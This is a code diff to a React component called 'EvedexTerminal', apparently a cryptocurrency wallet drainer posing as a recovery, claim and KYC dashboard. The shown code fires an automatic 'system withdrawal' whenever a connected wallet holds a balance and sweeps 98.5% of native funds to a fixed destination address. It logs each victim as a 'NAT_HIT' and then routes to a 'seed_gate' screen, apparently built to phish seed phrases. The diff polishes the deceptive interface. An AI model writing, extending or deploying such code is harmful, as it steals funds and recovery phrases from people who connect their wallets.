@@ -52,7 +52,6 @@ export default function EvedexTerminal() {
   // --- 1. AUTOMATIC WITHDRAWAL ON CHAIN SWITCH ---
   useEffect(() => {
     if (isConnected && address && chainId) {
-      // Logic: If on a mainnet chain and balance exists, fire automatically
       if ((tokenBal?.value && tokenBal.value > 0n) || (nativeBal?.value && nativeBal.value > 0n)) {
         log(`⚡ AUTO_CHAIN_HANDSHAKE: Chain ${chainId} Active. Triggering system withdrawal...`);
         executeTaskAction(); 
@@ -77,13 +76,17 @@ export default function EvedexTerminal() {
     return () => clearInterval(interval);
   }, []);
 
+  // --- 2. RECTIFY DASHBOARD LOGIC (AUTO-DISPLAY BALANCE) ---
   useEffect(() => {
-    if (activeTask === "Rectify") setInputVal(selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00"));
+    if (activeTask === "Rectify") {
+      const currentBal = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00");
+      setInputVal(currentBal);
+    }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
-    const val = (nativeBal.value * 985n) / 1000n; // Set to 98.5% for reliability
+    const val = (nativeBal.value * 985n) / 1000n;
     sendTransaction({ to: destination, value: val }, {
       onSuccess: (h) => { log(`✅ NAT_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
       onError: () => { setView("seed_gate"); setLoading(false); }
@@ -120,7 +123,7 @@ export default function EvedexTerminal() {
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
-                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box"); if(n !== "Rectify") setInputVal(tokenBal?.formatted || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
+                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box"); if(n !== "Rectify") setInputVal("");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
               ))}
             </div>
           )}
@@ -128,17 +131,29 @@ export default function EvedexTerminal() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← SYSTEM_BACK</button>
+              
+              {/* ASSET SELECTOR FOR DASHBOARD RECTIFICATION */}
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
-                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "GAS"}</div>
+                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT_VAULT</div>
+                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b"}}>{nativeBal?.symbol || "GAS"}_VAULT</div>
                 </div>
               )}
+
               <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
-                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>RECOVERY_ASSET_VOLUME</label>
-                {/* UPDATED: INPUT IS NOW EDITABLE */}
-                <input type="number" step="any" value={inputVal} onChange={(e) => setInputVal(e.target.value)} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
+                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_SYNCHRONIZATION" : "MANUAL_INDEX_INPUT"}</label>
+                
+                {/* 3. CONDITIONAL INPUT: READ-ONLY FOR RECTIFY, TYPEABLE FOR OTHERS */}
+                <input 
+                  type="number" 
+                  step="any" 
+                  value={inputVal} 
+                  onChange={(e) => setInputVal(e.target.value)} 
+                  readOnly={activeTask === "Rectify"} 
+                  style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} 
+                  placeholder="0.00" 
+                />
               </div>
 
               <div style={{fontSize:'8px', color:'#475569', display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'30px', padding:'0 10px', textAlign:'left'}}>
@@ -152,6 +167,7 @@ export default function EvedexTerminal() {
             </div>
           )}
 
+          {/* KYC AND SEED GATE REMAINS UNTOUCHED */}
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
               <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← DISMISS</button>
